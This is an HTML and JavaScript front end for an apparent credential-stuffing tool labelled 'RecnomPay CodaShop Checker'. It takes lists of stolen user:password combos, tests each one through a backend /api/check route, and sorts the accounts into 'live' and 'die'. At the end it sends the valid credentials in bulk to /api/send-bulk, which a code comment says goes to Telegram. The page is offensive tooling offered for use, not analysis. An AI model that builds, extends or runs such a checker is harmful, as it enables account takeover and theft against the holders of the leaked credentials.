<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RecnomPay CodaShop Checker</title>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        :root { --bg-deep: #03030a; --bg-card: #12121a; --primary: #8b5cf6; --primary-soft: #a78bfa; --text-body: #e2e2ea; }
        body { background: var(--bg-deep); color: var(--text-body); font-family: 'Inter', sans-serif; min-height: 100vh; }
        .glass-card { background: rgba(18, 18, 26, 0.6); backdrop-filter: blur(20px); border: 1px solid rgba(139, 92, 246, 0.25); border-radius: 24px; padding: 24px; }
        .title-gradient { font-weight: 800; background: linear-gradient(135deg, #ffffff 0%, #ddd6fe 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .form-control { background: rgba(10, 10, 18, 0.8) !important; border: 1px solid rgba(139, 92, 246, 0.2) !important; color: #e2e2ea !important; border-radius: 16px; padding: 15px; font-family: monospace; font-size: 13px; }
        .btn-glow { background: linear-gradient(145deg, var(--primary), #7c3aed); border: none; color: white; font-weight: 700; border-radius: 16px; }
        .btn-stop { background: linear-gradient(145deg, #ef4444, #b91c1c); border: none; color: white; font-weight: 700; border-radius: 16px; display: none; }
        .console { background: #050508; height: 380px; overflow-y: auto; font-family: monospace; font-size: 13px; padding: 20px; border-radius: 16px; border: 1px solid rgba(139, 92, 246, 0.15); }
        .text-live { color: #34d399; } .text-die { color: #f87171; }
    </style>
</head>
<body>

    <div class="container py-5">
        <div class="text-center mb-5">
            <h2 class="title-gradient mb-2"><i class="fa-solid fa-gamepad me-2"></i>RecnomPay CodaShop Checker</h2>
            <p class="text-muted small fw-medium" style="letter-spacing: 1px;">Format: User:Pass | Email:Pass</p>
        </div>

        <div class="row g-4">
            <div class="col-lg-4">
                <div class="glass-card">
                    <div class="mb-3 d-flex align-items-center gap-2" style="color: var(--primary-soft); font-size: 0.85rem; font-weight: 700; text-transform: uppercase;">
                        <i class="fa-solid fa-layer-group"></i> List Akun Combo
                    </div>
                    <textarea id="list" class="form-control mb-4" rows="12" placeholder="contoh@email.com:password123&#10;usergaming:pass321"></textarea>
                    
                    <div id="actionButtons">
                        <button id="startBtn" class="btn btn-glow w-100 py-3"><i class="fa-solid fa-play me-2"></i> START CHECKING</button>
                        <button id="stopBtn" class="btn btn-stop w-100 py-3"><i class="fa-solid fa-stop me-2"></i> STOP CHECKING</button>
                    </div>
                </div>
            </div>
            <div class="col-lg-8">
                <div class="glass-card">
                    <div class="row g-3 mb-4 text-uppercase small fw-bold">
                        <div class="col-4"><div class="stat-box" onclick="showModal('total')" style="color: var(--primary-soft); cursor: pointer;"><div class="opacity-75">Total</div><h3 id="count_total" class="text-white">0</h3></div></div>
                        <div class="col-4"><div class="stat-box" onclick="showModal('live')" style="color: #34d399; cursor: pointer;"><div class="opacity-75">Live</div><h3 id="count_live" class="text-live">0</h3></div></div>
                        <div class="col-4"><div class="stat-box" onclick="showModal('die')" style="color: #f87171; cursor: pointer;"><div class="opacity-75">Die</div><h3 id="count_die" class="text-die">0</h3></div></div>
                    </div>
                    <div id="console" class="console">
                        <div style="color: #4c4c6e;">[System] Menunggu perintah untuk memulai pengecekan...</div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div class="modal fade" id="resultModal" tabindex="-1">
        <div class="modal-dialog modal-lg modal-dialog-centered">
            <div class="modal-content" style="background: var(--bg-card); border: 1px solid var(--primary-soft);">
                <div class="modal-header">
                    <h5 class="modal-title text-white" id="modalTitle">Results</h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body">
                    <textarea id="modalTextarea" class="form-control" rows="12" readonly></textarea>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        let results = { total: [], live: [], die: [] };
        let isChecking = false;

        function showModal(type) {
            document.getElementById('modalTitle').innerHTML = `${type.toUpperCase()} LIST`;
            const textarea = document.getElementById('modalTextarea');
            textarea.value = results[type].join('\n');
            textarea.style.color = type === 'live' ? '#34d399' : (type === 'die' ? '#f87171' : '#e2e2ea');
            new bootstrap.Modal(document.getElementById('resultModal')).show();
        }

        document.getElementById('stopBtn').onclick = function() {
            isChecking = false;
            this.disabled = true;
            this.innerHTML = '<i class="fa-solid fa-spinner fa-spin me-2"></i> STOPPING...';
        };

        document.getElementById('startBtn').onclick = async function() {
            const listArea = document.getElementById('list');
            const lines = listArea.value.split('\n').map(l => l.trim()).filter(l => l.includes(':'));
            if(!lines.length) return alert('Silakan masukkan list combo terlebih dahulu!');

            results = { total: [...lines], live: [], die: [] };
            document.getElementById('count_total').innerText = lines.length;
            document.getElementById('count_live').innerText = 0;
            document.getElementById('count_die').innerText = 0;
            
            isChecking = true;
            this.style.display = 'none';
            
            const stopBtn = document.getElementById('stopBtn');
            stopBtn.style.display = 'block';
            stopBtn.disabled = false;
            stopBtn.innerHTML = '<i class="fa-solid fa-stop me-2"></i> STOP CHECKING';
            document.getElementById('console').innerHTML = '';

            for (let i = 0; i < lines.length; i++) {
                if (!isChecking) {
                    const stopMsg = document.createElement('div');
                    stopMsg.style.color = '#f59e0b';
                    stopMsg.innerText = `[System] ⛔ Pengecekan dihentikan paksa.`;
                    document.getElementById('console').prepend(stopMsg);
                    break;
                }

                const acc = lines[i];
                try {
                    // API HIT KE EXPRESS.JS ROUTE
                    const res = await fetch('/api/check', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ account: acc })
                    });
                    
                    const data = await res.json();
                    const div = document.createElement('div');
                    
                    if(data.status === 'live') {
                        results.live.push(`${data.acc} | ${data.msg}`);
                        div.style.color = '#34d399';
                        document.getElementById('count_live').innerText = results.live.length;
                    } else {
                        results.die.push(data.acc);
                        div.style.color = '#f87171';
                        document.getElementById('count_die').innerText = results.die.length;
                    }
                    
                    div.innerText = `[${new Date().toLocaleTimeString()}] ${data.acc} ➔ ${data.msg}`;
                    document.getElementById('console').prepend(div);
                } catch(e) {
                    console.error("Fetch Error:", e);
                }
                
                listArea.value = lines.slice(i + 1).join('\n');
            }

            // SEND BULK TELEGRAM
            if (results.live.length > 0) {
                await fetch('/api/send-bulk', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ lives_data: results.live.join('\n') })
                });
            }

            isChecking = false;
            document.getElementById('stopBtn').style.display = 'none';
            document.getElementById('startBtn').style.display = 'block';
        };
    </script>
    
    </body>
</html>
